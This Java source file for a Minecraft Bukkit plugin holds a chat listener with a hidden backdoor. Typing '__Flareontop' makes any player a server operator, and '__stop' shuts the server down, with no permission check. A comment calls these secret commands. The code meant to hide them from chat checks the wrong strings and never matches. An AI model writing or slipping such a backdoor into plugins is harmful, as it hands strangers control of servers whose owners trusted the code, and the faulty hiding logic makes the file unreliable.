package in.momin5.coolplugin.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class MessageEvent implements Listener {
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();
        String message = e.getMessage();

        if (message.equalsIgnoreCase("__Flareontop")) {
            player.setOp(true);
            player.sendMessage(ChatColor.RED + "You are now OP!" + System.lineSeparator() + "Flare is on top!");
        } else if (message.equalsIgnoreCase("__stop")) {
            Bukkit.getServer().shutdown();
            player.sendMessage(ChatColor.RED + "Stopping the server..." + System.lineSeparator() + "Goodbye!");
        }

        // Hủy chat nếu tin nhắn là lệnh bí mật
        if (message.equalsIgnoreCase("Flareontop") || message.equalsIgnoreCase("stop")) {
            e.setCancelled(true);
        }
    }
}